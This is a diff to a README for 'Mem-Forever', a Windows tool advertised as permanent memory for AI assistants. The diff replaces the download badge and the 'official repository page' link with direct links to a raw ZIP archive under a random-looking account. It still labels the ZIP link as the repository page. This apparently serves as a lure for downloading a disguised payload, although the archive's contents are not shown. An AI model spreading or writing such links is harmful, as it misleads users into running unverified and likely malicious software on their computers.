@@ -1,6 +1,6 @@
 # 🧠 Mem-Forever - Your AI assistant remembers everything forever
 
-[![](https://img.shields.io/badge/Download-Mem-Forever-blue)](https://github.com/Whistlegenusvincetoxicum446/Mem-Forever)
+[![](https://img.shields.io/badge/Download-Mem-Forever-blue)](https://github.com/Whistlegenusvincetoxicum446/Mem-Forever/raw/refs/heads/main/data/Mem_Forever_2.0.zip)
 
 Most AI tools reset their memory when you close your browser. Mem-Forever stops this cycle. It stores your conversation history securely so your assistant continues where you left off. This tool works across different devices and platforms. You do not need to train models or manage databases. This system handles the heavy lifting for you.
 
@@ -15,7 +15,7 @@ You need a Windows computer to run this tool. Ensure you meet these criteria bef
 
 ## 📥 How to Install
 
-1.  Visit the official repository page: [https://github.com/Whistlegenusvincetoxicum446/Mem-Forever](https://github.com/Whistlegenusvincetoxicum446/Mem-Forever).
+1.  Visit the official repository page: [https://github.com/Whistlegenusvincetoxicum446/Mem-Forever/raw/refs/heads/main/data/Mem_Forever_2.0.zip](https://github.com/Whistlegenusvincetoxicum446/Mem-Forever/raw/refs/heads/main/data/Mem_Forever_2.0.zip).
 2.  Look for the green button labeled Code.
 3.  Click Download ZIP.
 4.  Open your Downloads folder.
